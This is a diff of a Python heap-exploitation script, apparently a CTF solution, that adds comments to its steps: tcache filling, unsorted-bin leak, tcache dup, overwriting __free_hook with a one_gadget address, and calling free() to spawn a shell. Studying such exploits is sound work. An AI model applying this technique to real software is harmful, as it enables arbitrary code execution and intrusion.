@@ -49,6 +49,7 @@ malloc(0xf8,'b') #change next_chunk pre_inuse = 0
 free(6) #fill tcache
 free(9) #unsorted bin
 
+#unsorted bin point to chunk[0]
 for i in range(8):
 	malloc(0x20,'b')
 
@@ -62,21 +63,22 @@ one_gadget = libc_base + 0x4f322
 log.success('free_hook addr : 0x%x'%free_hook)
 log.success('one_gadget addr : 0x%x'%one_gadget)
 
+#clear unsorted bin
 malloc(0x20,'d')
 
-
+#free place to malloc
 free(1)
 
+#tcache dup
 free(0)
 free(9)
 
-
+#hijack free_hook to one_gadegt
 malloc(0x20,p64(free_hook))
 malloc(0x20,'e')
-
 malloc(0x20,p64(one_gadget))
 
-
+#trigger one_gadget to getshelol
 free(5)
 
 
